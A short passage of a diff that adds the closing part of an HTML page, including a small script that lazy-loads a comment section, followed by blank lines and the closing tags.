+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
